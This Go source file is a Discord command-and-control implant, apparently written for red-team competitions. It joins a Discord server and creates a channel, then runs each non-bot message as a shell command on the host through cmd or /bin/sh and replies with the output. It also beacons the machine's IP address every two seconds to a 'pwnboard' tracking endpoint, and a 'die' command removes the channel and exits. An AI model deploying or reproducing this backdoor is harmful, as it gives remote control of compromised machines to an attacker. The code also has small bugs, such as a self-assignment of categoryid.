package main

import (
	"context"
	"os"
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"net/http"
	"bytes"
	"time"
	"encoding/json"
	"gopkg.in/yaml.v3"
	"github.com/andersfylling/disgord"
	creator "./discord"
)

var categoryid int

//Config is used to represent the config file
type Config struct {
    Discord struct {
        Token string `yaml:"bot_token"`
        ID int `yaml:"server_id"`
	} `yaml:"discord"`
	
    Channel struct {
        OS string `yaml:"category_name"`
        TeamNum string `yaml:"channel_name"`
    } `yaml:"channel"`
}

type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

func processError(err error){
	fmt.Println("Error: ", err)
}

func userInput(s disgord.Session, evt *disgord.MessageCreate){
	msg := evt.Message

	if !evt.Message.Author.Bot{
		if msg.Content == "ping" {
			s.SendMsg(context.Background(), msg.ChannelID, "I am alive. Thanks")	
		}else if msg.Content == "die"{
			// Delete Channel
			s.DeleteChannel(context.Background(), msg.ChannelID)
			s.DeleteChannel(context.Background(), disgord.Snowflake(categoryid))
			os.Exit(0)
		}else{
			fmt.Println("Input: ", msg.Content)

			//run os command and send results
			output := shellRun(msg.Content)
			if output == ""{
				msg.Reply(context.Background(), s, "Command didn't return anything")
			}else{
				prettyOutput := "```" + output + "```"
				msg.Reply(context.Background(), s, prettyOutput)
			}
		}
	}else{
		fmt.Println("It is a bot")
	}
}

//TODO: Still have some error
func shellRun(cmd string) string{
	var shell, flag string
	if runtime.GOOS == "windows"{
		shell = "cmd"
		flag = "/c"
	} else{
		shell = "/bin/sh"
		flag = "-c"
	}

	out, err := exec.Command(shell, flag, cmd).Output()
	if err != nil {
		panic(err)
	}

	return string(out)
}

func updatepwnBoard(ip string){
	for {

		time.Sleep(2 * time.Second)

		// url := "http://pwnboard.win/generic"
		url := "http://localhost:8080"

     	// Create the struct
     	data := PwnBoard{
        	IPs:  ip,
        	Type: "sexyPotat0",
     	}

    	// Marshal the data
    	sendit, err := json.Marshal(data)
    	if err != nil {
        	fmt.Println("\n[-] ERROR SENDING POST:", err)
        	return
    	}

    	// Send the post to pwnboard
    	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
    	if err != nil {
        	fmt.Println("[-] ERROR SENDING POST:", err)
        	return
    	}

		defer resp.Body.Close()
	}
}

func getIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}

	for _, a := range addrs {
		if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

func main(){
	// Config file
	f, err := os.Open("config.yaml")
	if err != nil {
		processError(err)
	}
	defer f.Close()

	var config Config
	decoder := yaml.NewDecoder(f)
	err = decoder.Decode(&config)
	if err != nil {
	    processError(err)
	}

	client := disgord.New(disgord.Config{
		BotToken: config.Discord.Token,
		Logger: disgord.DefaultLogger(false),
	})

	id := config.Discord.ID
	categoryName := config.Channel.OS
	channelName := config.Channel.TeamNum

	// Pwnboard test
	go updatepwnBoard(getIP())

	defer client.StayConnectedUntilInterrupted(context.Background())

	guild, err := client.GetGuild(context.Background(), disgord.Snowflake(id))
	processError(err)

	//create catogory
	category := creator.CreateCategory(client, id, categoryName)
	categoryid = categoryid

	//general channel
	// creator.CreateChannel(client, id,  category, "general")

	//create channel
	creator.CreateChannel(client, id,  category, channelName)
	channels := &guild.Channels
	fmt.Println(channels)

	client.On(disgord.EvtMessageCreate, userInput)
}
